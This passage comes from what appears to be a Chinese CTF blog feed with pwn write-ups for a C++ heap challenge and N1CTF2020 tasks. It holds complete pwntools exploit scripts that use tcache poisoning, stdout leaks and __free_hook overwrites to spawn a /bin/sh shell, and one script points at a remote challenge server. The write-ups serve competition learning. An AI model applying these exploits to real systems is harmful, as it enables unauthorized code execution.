class="line"><span class="string">    mov rax,rdx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov byte ptr [r12+0xffe],1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor rdi,rdi</span></span><br><span class="line"><span class="string">    mov rax,0xe7</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    check:</span></span><br><span class="line"><span class="string">    xor rcx,rcx</span></span><br><span class="line"><span class="string">    find_cc:</span></span><br><span class="line"><span class="string">    movabsqr11,-3689348814741910324</span></span><br><span class="line"><span class="string">    cmpq qword ptr [rdx + rcx*8],r11</span></span><br><span class="line"><span class="string">    je find_</span></span><br><span class="line"><span class="string">    inc rcx</span></span><br><span class="line"><span class="string">    cmpw cx,0x200</span></span><br><span class="line"><span class="string">    jne find_cc</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">    find_:</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    code=asm(shellcode).ljust(<span class="number">2046</span>,<span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line">    <span class="comment"># code=(asm(shellcode)).encode(&#x27;hex&#x27;)</span></span><br><span class="line">    p.send(<span class="string">&#x27;\x90&#x27;</span>+code+<span class="string">&#x27;\x90&#x27;</span>*<span class="number">2</span>+code[:-<span class="number">11</span>]+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># p.recvuntil(&quot;SUCCEED&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># main(&quot;39.97.171.121&quot;)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            main(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br></pre></td></tr></table></figure><h4 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h4><blockquote><p>Heap exploiting is so boring .</p></blockquote><p>一道c++写的菜单题，由于没有对指针的清零导致我们可以一直dele，因此我们可以一直dele来填满tecache，从而进入fastibin。</p><p>题目限制了malloc的size，但我们可以利用basic_string扩容的规则来触发malloc_consolidate，来得到存放有main_arena的bins。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">create_des()</span><br><span class="line">create_des()</span><br><span class="line">create_des()</span><br><span class="line">write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    del_des()</span><br><span class="line">write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    del_des()</span><br><span class="line">write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    del_des()</span><br><span class="line">write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x50</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    del_des()</span><br><span class="line">write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p>效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [  2]: 0x555a28604e90 ◂— 0x555a28604e90</span><br><span class="line">0x30 [  1]: 0x555a28604f60 ◂— 0x0</span><br><span class="line">0x40 [  7]: 0x555a28604eb0 —▸ 0x7f6268435cd0 (main_arena+144) —▸ 0x7f6268435cc0 (main_arena+128) —▸ 0x7f6268435cb0 (main_arena+112) —▸ 0x7f6268435ca0 (main_arena+96) —▸ 0x555a28605870 ◂— 0x0</span><br><span class="line">0x50 [  1]: 0x555a28604f90 ◂— 0x0</span><br><span class="line">0x60 [  7]: 0x555a28605160 —▸ 0x555a28604ea0 ◂— 0x0</span><br><span class="line">0x70 [  7]: 0x555a28605070 —▸ 0x7f6268435de0 (main_arena+416) —▸ 0x7f6268435dd0 (main_arena+400) —▸ 0x7f6268435dc0 (main_arena+384) —▸ 0x7f6268435db0 (main_arena+368) —▸ 0x7f6268435da0 (main_arena+352) —▸ 0x7f6268435d90 (main_arena+336) —▸ 0x7f6268435d80 (main_arena+320) ◂— ...</span><br><span class="line">0x80 [  7]: 0x555a286050e0 ◂— 0x0</span><br><span class="line">0x90 [  1]: 0x555a28604fe0 ◂— 0x0</span><br><span class="line">0x100 [  1]: 0x555a286051c0 ◂— 0x0</span><br><span class="line">0x1f0 [  1]: 0x555a286052c0 ◂— 0x0</span><br><span class="line">0x3d0 [  1]: 0x555a286054b0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x40: 0x555a28604ea0 —▸ 0x7f6268435cd0 (main_arena+144) ◂— 0x555a28604ea0</span><br><span class="line">0x150: 0x555a28605060 —▸ 0x7f6268435de0 (main_arena+416) ◂— 0x555a28605060 /* &#x27;`P`(ZU&#x27; */</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>之后就是劫持stdout泄露了，利用small bin和0x40的tecache的overlop改main_arena的后低两个字节，但要先把0x20的tecache申请出来。</p><p>leak的时候有个问题要注意：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x30 [  1]: 0x561f2bafef60 ◂— 0x0</span><br><span class="line">0x40 [  7]: 0x561f2bafeeb0 —▸ 0x7fc5c83ae758 (_IO_2_1_stderr_+216) —▸ 0x7fc5c83aa2a0 (_IO_file_jumps) ◂— 0x0</span><br><span class="line">0x50 [  1]: 0x561f2bafef90 ◂— 0x0</span><br><span class="line">0x60 [  7]: 0x561f2baff160 —▸ 0x561f2bafeea0 ◂— 0x0</span><br><span class="line">0x70 [  7]: 0x561f2baff070 —▸ 0x7fc5c83adde0 (main_arena+416) —▸ 0x7fc5c83addd0 (main_arena+400) —▸ 0x7fc5c83addc0 (main_arena+384) —▸ 0x7fc5c83addb0 (main_arena+368) —▸ 0x7fc5c83adda0 (main_arena+352) —▸ 0x7fc5c83add90 (main_arena+336) —▸ 0x7fc5c83add80 (main_arena+320) ◂— ...</span><br><span class="line">0x80 [  7]: 0x561f2baff0e0 ◂— 0x0</span><br><span class="line">0x90 [  1]: 0x561f2bafefe0 ◂— 0x0</span><br><span class="line">0x100 [  1]: 0x561f2baff1c0 ◂— 0x0</span><br><span class="line">0x1f0 [  1]: 0x561f2baff2c0 ◂— 0x0</span><br><span class="line">0x3d0 [  1]: 0x561f2baff4b0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x561f2bafeec0 —▸ 0x7fc5c83adca0 (main_arena+96) ◂— 0x561f2bafeec0</span><br><span class="line">smallbins</span><br><span class="line">0x150: 0x561f2baff060 —▸ 0x7fc5c83adde0 (main_arena+416) ◂— 0x561f2baff060</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20gx 0x561f2bafeeb0-0x10</span><br><span class="line">0x561f2bafeea0:0x00000000000000000x0000000000000021</span><br><span class="line">0x561f2bafeeb0:0x00007fc5c83ae7580x00007fc5c83adcd0</span><br><span class="line">0x561f2bafeec0:0x61616161616161610x0000000000000021</span><br><span class="line">0x561f2bafeed0:0x00007fc5c83adca00x00007fc5c83adca0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在改了main_arena之后unsortedbin里的bin和0x40的第一个tecache是overlop的，这时如果我们直接取0x40的tecache和话就应注意不要改坏unsorted bin的结构，或者我们可以先把unsortedbin申请空在取0x40的tecache，这样就没什么问题了。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;[B]ye&quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_des</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_des</span>(<span class="params">content</span>):</span><br><span class="line">    cmd(<span class="string">&#x27;W&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_des</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">1234</span></span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> host:</span><br><span class="line">        p=remote(host,port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=process(<span class="string">&quot;./cpp&quot;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    create_des()</span><br><span class="line">    create_des()</span><br><span class="line">    create_des()</span><br><span class="line">    write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        del_des()</span><br><span class="line">    write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        del_des()</span><br><span class="line">    write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        del_des()</span><br><span class="line">    write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x50</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        del_des()</span><br><span class="line">    write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x500</span>)</span><br><span class="line">    write_des(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    write_des(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    <span class="comment"># for i in range(4):</span></span><br><span class="line"><span class="comment"># del_des()</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    stdout=<span class="built_in">int</span>(raw_input(<span class="string">&quot;input: &quot;</span>),<span class="number">16</span>)</span><br><span class="line">    write_des(p16(stdout-<span class="number">8</span>))</span><br><span class="line">    write_des(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    write_des(p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    libc.address=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3ed8b0</span></span><br><span class="line">    success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">    write_des(p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    write_des(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">    write_des(p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x58</span>)</span><br><span class="line">    write_des(<span class="string">&#x27;/bin/sh&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;</span>)</span><br><span class="line">    main(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>N1CTF2020</title>
      <link href="/2020/10/28/N1CTF2020/"/>
      <url>/2020/10/28/N1CTF2020/</url>
      
        <content type="html"><![CDATA[<h3 id="N1CTF-Pwn-amp-Re部分"><a href="#N1CTF-Pwn-amp-Re部分" class="headerlink" title="N1CTF Pwn&amp;Re部分"></a>N1CTF Pwn&amp;Re部分</h3><blockquote><p>拖了好久的wp，差点咕咕咕了⏰</p></blockquote><span id="more"></span><h4 id="sigin"><a href="#sigin" class="headerlink" title="sigin"></a>sigin</h4><p>这题我开始的思路错了，先去劫持tecache_struct泄露，之后打free_hook的时候也是改的tecache_struct，由于tecache_struct和我们申请的heap之间还有一个0x1010的堆，导致后面再去调整cur指针时疯狂循环dele大概0x2000多次🤦，本地通了，远程GG，所以后面换了种解法0.0</p><p>先分析程序逻辑，C++写的菜单题，使用了vector来存储我们的数据，我们可以拥有两个vector。</p><p>数据结构为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">con</span>&#123;</span></span><br><span class="line">  <span class="type">void</span> *begin;</span><br><span class="line">  <span class="type">void</span> *cur;</span><br><span class="line">  <span class="type">void</span> *end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当cur&#x3D;&#x3D;end时vector会进行扩容的操作，先申请一个更大的堆，之后将数据copy过去，再将旧堆free。扩容大小依次为<code>0x20,0x20,0x30,0x50,0x90,0x110,0x210,0x410,0x810,0x1010</code>(就堆的大小而言)</p><p>漏洞在于dele时只是将cur指针减小8，因此我们可以通过dele控制cur指针，配合add可任意地址写。</p><p>利用思路：<br>1.通过不断add使得扩容free的堆放入unsorted bin<br>2.dele控制cur指向unsortedbin-&gt;fd的地址，配合show泄露。<br>3.之后利用vecort扩容的规律<code>0x20,0x20</code>，先将在tecache的0x20位置的第一个bin1-&gt;fd写如__free_hook-8，之后vector2先拿出bin1。这里写入str(0x68732f6e69622f)(即’&#x2F;bin&#x2F;sh’)，之后<code>add(2,str(libc.sym[&#39;system&#39;]))</code>,由于扩容从而在free_hook-8写入’&#x2F;bin&#x2F;sh’同时劫持free_hook为system。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,number</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(number)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">9990</span></span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> host:</span><br><span class="line">        p=remote(host,port)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=process(<span class="string">&quot;./signin&quot;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">258</span>):</span><br><span class="line">        add(<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x206</span>-<span class="number">3</span>):</span><br><span class="line">        dele(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    offset=<span class="number">0x3ebca0</span></span><br><span class="line">    libc.address=<span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>))-offset</span><br><span class="line">    success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x00010d</span>):</span><br><span class="line">        dele(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="built_in">str</span>(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">8</span>))</span><br><span class="line">    add(<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">0x68732f6e69622f</span>))</span><br><span class="line">    add(<span class="number">2</span>,<span class="built_in">str</span>(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add(1,&#x27;1234&#x27;)</span></span><br><span class="line">    <span class="comment"># add(1,&#x27;1000&#x27;)</span></span><br><span class="line">    <span class="comment"># # add(1,&#x27;1234&#x27;)</span></span><br><span class="line">    <span class="comment"># add(1,&#x27;2222&#x27;)</span></span><br><span class="line">    <span class="comment"># for i in range(6):</span></span><br><span class="line">    <span class="comment">#     dele(1)</span></span><br><span class="line">    <span class="comment"># show(1)</span></span><br><span class="line">    <span class="comment"># heap_addr=int(p.recvuntil(&quot;\n&quot;))</span></span><br><span class="line">    <span class="comment"># success(&quot;heap: &quot;+hex(heap_addr))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># dele(1)</span></span><br><span class="line">    <span class="comment"># add(1,str(heap_addr-0x011e60))</span></span><br><span class="line">    <span class="comment"># add(2,&#x27;18446744073709551615&#x27;)</span></span><br><span class="line">    <span class="comment"># add(2,&#x27;18446744073709551615&#x27;)</span></span><br><span class="line">    <span class="comment"># for i in range(31):</span></span><br><span class="line">    <span class="comment">#     add(2,&#x27;1&#x27;)</span></span><br><span class="line">    <span class="comment"># for i in range(0x220/8-2):</span></span><br><span class="line">    <span class="comment">#     dele(2)</span></span><br><span class="line">    <span class="comment"># show(2)</span></span><br><span class="line">    <span class="comment"># offset=0x3ebca0</span></span><br><span class="line">    <span class="comment"># libc.address=int(p.recvuntil(&quot;\n&quot;))-offset</span></span><br><span class="line">    <span class="comment"># success(&quot;libc: &quot;+hex(libc.address))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># for i in range(0x0023ee+4):</span></span><br><span class="line">    <span class="comment">#     dele(2)</span></span><br><span class="line">    <span class="comment">#     print&quot;times:&quot;+str(i)</span></span><br><span class="line">    <span class="comment"># add(2,str(libc.sym[&#x27;__free_hook&#x27;]-8))</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># add(1,&#x27;0&#x27;)</span></span><br><span class="line">    <span class="comment"># add(1,&#x27;0&#x27;)</span></span><br><span class="line">    <span class="comment"># add(1,str(0x31))</span></span><br><span class="line">    <span class="comment"># one=0x4f3c2</span></span><br><span class="line">    <span class="comment"># realloc_hook=libc.symbols[&#x27;__libc_realloc&#x27;]</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># binsh=0x68732f6e69622f</span></span><br><span class="line">    <span class="comment"># add(1,str(binsh))</span></span><br><span class="line">    <span class="comment"># add(1,str(libc.sym[&#x27;system&#x27;]))</span></span><br><span class="line">    <span class="comment"># for i in range(3):</span></span><br><span class="line">    <span class="comment">#     add(1,&#x27;0&#x27;)    #注释的是第一种解法。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    libc=ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line">    main(<span class="string">&quot;47.242.161.199&quot;</span>)</span><br><span class="line">    <span class="comment"># main(0)</span></span><br></pre></td></tr></table></figure><h4 id="easywrite"><a href="#easywrite" class="headerlink" title="easywrite"></a>easywrite</h4><p>这题学到新姿势了，ruan师傅几分钟打通tql。</p><p>程序逻辑很简单，给了我们libc地址，有一次往任意地址写入heap地址的机会，而且heap的内容可控，之后程序会申请0x30的堆存放留言，并在退出时free。</p><p>由于最后的这个0x30的堆malloc&#x2F;free操作很可疑，最后应该就是要劫持free_hook，使得在free时触发。</p><p>没想到上题没用到tecache_struct，而这题用到了。libc中有个指针，指向tacache_struct，程序也是通过这个指针找到tecache_struct的位置的。</p><p>因此我们只要将这个指针指向内容可控的heap，就能伪造tecache_struct，并且在假struct中对应0x40大小bin的位置写入free_hook，那接下来的malloc(0x30)就会拿到free_hook，进而劫持free_hook:)</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 